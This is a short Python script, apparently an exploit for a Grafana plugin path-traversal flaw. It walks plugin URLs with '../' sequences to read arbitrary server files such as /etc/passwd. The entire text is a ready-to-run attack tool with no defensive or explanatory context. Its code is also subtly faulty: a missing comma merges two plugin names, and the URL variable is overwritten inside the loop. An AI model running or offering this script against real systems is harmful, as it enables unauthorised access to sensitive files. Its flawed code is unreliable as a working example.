
import sys
import urllib.request

plugins = ["alertlist", "annolist", "barchart", "bargauge", "candlestick", "cloudwatch", "dashlist", "elasticsearch", "gauge", "geomap", "gettingstarted", "grafana-azure-monitor-datasource", "graph", "heatmap", "histogram", "influxdb" "jaeger", "logs", "loki", "mssql", "mysql", "news", "nodeGraph", "opentsdb", "piechart", "pluginlist","postgres","prometheus", "stackdriver", "stat", "state-timeline", "status-history", "table", "table-old", "tempo", "testdata", "text", "timeseries", "welcome", "zipkin"]

if len(sys.argv) != 3:
    print("Usage -> python3 grafana-exploit.py http://127.0.0.1/ /etc/passwd ")
else:
    url = str(sys.argv[1])
    path = str(sys.argv[2])
    for plug in plugins:
        url = f"{url}/public/plugins/{plug}/../../../../../../../../../../../../../../../../../../..{path}"
        response = urllib.request.urlopen(url)
        if response.getcode() == 200:
            print("\n"+response.read().decode())
            exit(0)
